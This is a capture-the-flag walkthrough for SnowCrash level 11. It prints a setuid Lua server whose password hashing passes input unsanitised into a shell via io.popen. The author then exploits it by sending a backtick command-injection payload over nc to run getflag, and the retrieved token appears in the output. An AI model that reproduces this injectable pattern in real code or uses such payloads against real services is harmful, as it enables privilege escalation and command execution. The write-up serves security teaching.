```
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
-r-x------  1 level11 level11  675 Apr  3  2012 .profile

level11@SnowCrash:~$ ./level11.lua
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?

level11@SnowCrash:~$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

It seems that level11.lua creates a server on localhost:5151 and a client that expects password. This password is later hashed with `echo`. So that is our way in. But first a little experimentation:
```
level11@SnowCrash:~$ nc localhost 5151
Password: fkjhf
Erf nope..

level11@SnowCrash:~$ nc localhost 5151
Password: f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
Erf nope..
```
If we reverse sha1sum with [decoder](https://www.dcode.fr/sha1-hash) we get this line:
*NotSoEasy*
```
level11@SnowCrash:~$ nc localhost 5151
Password: NotSoEasy
Erf nope..
```
But it also doesn't work.

Time to exploit `echo`:
```
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag > /tmp/lvl11`
Erf nope..

level11@SnowCrash:~$ ls -la /tmp/lvl11
-rw-r--r-- 1 flag11 flag11 58 Sep 21 21:18 /tmp/lvl11

level11@SnowCrash:~$ cat /tmp/lvl11
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
